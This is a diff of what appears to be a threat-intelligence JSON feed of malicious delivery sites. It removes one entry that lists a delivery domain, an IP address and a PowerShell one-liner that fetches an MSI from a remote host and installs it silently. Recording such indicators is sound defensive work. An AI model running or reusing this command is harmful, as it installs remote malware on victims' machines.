@@ -3276,24 +3276,5 @@
     ],
     "ReportId": "cmwcq9cnn0c1l0omlfc0yrkd9",
     "ScannedAt": "2026-11-11T23:05:45.104000+00:00"
-  },
-  {
-    "UrlDomain": "24hr.co.il",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "80.244.168.18"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwclwpgw0a210omltnipi6za",
-    "ScannedAt": "2026-11-11T21:03:56.705000+00:00"
   }
 ]
